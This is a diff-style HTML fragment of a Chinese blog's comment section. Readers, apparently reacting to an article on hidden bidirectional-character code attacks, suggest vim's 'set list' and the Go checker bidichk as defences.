+<li id="comment-2361112" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-2361112" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/fb5348d75c2744563c53e8c1c81c16e6?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/fb5348d75c2744563c53e8c1c81c16e6?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://whtiehouse.gov" class="url" rel="ugc external nofollow">ns</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2361112"><time datetime="2022-01-24T16:14:13+08:00">2022年01月24日 16:14</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>用vim，设置 set list可以避免这种攻击</p>
+</div>
+ </article>
+</li>
+<li id="comment-2361529" class="comment even thread-even depth-1">
+<article id="div-comment-2361529" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/c275accd4e4d3ff01ad8bcc02a3914eb?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/c275accd4e4d3ff01ad8bcc02a3914eb?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="https://www.cnblogs.com/yahuian" class="url" rel="ugc external nofollow">yahuian</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2361529"><time datetime="2022-01-26T15:07:48+08:00">2022年01月26日 15:07</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>Go 有一个小工具可以检查 <a href="https://github.com/breml/bidichk" rel="nofollow ugc">https://github.com/breml/bidichk</a></p>
+</div>
+ </article>
+</li>
+<li id="comment-2362305" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="https://itpcb.com/a/2139122" class="url" rel="ugc external nofollow">如何快速写出高质量的 Go 代码？ - 算法网</a> </div>
+</li>
+<li id="comment-2370718" class="comment even thread-even depth-1">
+<article id="div-comment-2370718" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/cb160f0dc559c72a5dd3e076f9df8b59?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/cb160f0dc559c72a5dd3e076f9df8b59?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">XiaoQ</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/21649.html#comment-2370718"><time datetime="2022-09-20T21:21:42+08:00">2022年09月20日 21:21</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>那么，使用 Vim 编程不就可以解决问题了吗</p>
+</div>
+ </article>
+</li>
+</ol>
+
+</div>
+</div>
+</div>
+
+</div> 
+</div>
+
+</div>
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html>
